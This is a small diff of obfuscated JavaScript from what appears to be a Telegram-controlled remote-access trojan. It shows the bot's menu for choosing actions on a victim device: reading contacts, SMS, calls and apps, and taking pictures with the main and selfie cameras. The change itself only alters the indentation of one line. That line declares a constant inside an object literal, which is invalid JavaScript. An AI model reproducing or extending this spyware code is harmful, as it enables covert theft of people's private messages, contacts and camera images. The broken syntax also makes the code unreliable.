@@ -358,7 +358,7 @@ bot.on("message", _0xdbde0c => {
                               bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x3202e5 + "</b>\n\n", {
                                 'parse_mode': "HTML",
                                 'reply_markup': {
-                                  const actions = [
+                                 const actions = [
                                         ["✯ Contacts ✯", "✯ SMS ✯"],
                                         ["✯ Calls ✯", "✯ Apps ✯"],
                                         ["✯ Main camera ✯", "✯ Selfie Camera ✯"],
